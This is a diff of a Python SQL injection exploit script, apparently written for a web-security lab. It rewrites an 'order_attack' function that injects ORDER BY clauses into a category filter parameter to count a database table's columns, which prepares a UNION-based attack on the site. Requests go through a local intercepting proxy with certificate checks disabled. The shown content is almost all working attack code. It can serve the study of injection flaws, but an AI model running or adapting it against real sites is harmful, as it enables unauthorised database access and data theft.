@@ -14,17 +14,17 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 # def union_attack(base_url, attack_payload):
 #     pass
 
-def order_attack(base_url):
-    counter = 0
-    while True:
-        counter += 1
-        uri = f"filter?category='ORDER BY {counter}--"
-        r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
-        if r.status_code != 200 or counter > 25:
-            break
-    return  counter - 1 if counter <= 25 else 0
 
-    
+def order_attack(base_url):
+    number_of_columns = 0
+    for i in range(1, 50):
+        uri = f"filter?category='ORDER BY {i}--"
+        r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
+        if r.status_code != 200:
+            number_of_columns = i - 1
+            break
+    return number_of_columns
+
 
 def exploit_sqli(base_url):
     number_of_columns = order_attack(base_url)
